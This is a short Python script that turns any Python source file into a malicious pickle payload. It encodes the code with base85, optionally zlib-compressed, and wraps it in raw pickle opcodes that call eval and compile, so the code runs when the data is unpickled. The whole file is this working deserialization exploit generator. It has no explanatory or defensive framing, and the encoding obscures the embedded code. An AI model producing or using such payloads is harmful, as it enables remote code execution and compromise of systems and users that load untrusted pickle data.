from base64 import b85encode
from zlib import compress

path = input('Python script filename>')
try:
    data = open(path, 'rb').read()
except FileNotFoundError:
    print('File not found')
    exit()

compress_data = b85encode(compress(data))
data = b85encode(data)

payload = b'c__builtin__\neval\n(c__builtin__\ncompile\n(V'
compress_exec_payload = b'exec(zlib.decompress(base64.b85decode("' + compress_data + b'")).decode())'
exec_payload = b'exec(base64.b85decode("' + data + b'").decode())'
if len(compress_exec_payload) < len(exec_payload):
    payload += b'import base64,zlib;'
    payload += compress_exec_payload
else:
    payload += b'import base64;'
    payload += exec_payload
payload += b'\nV-\nVexec\ntRtR.'

print(payload)
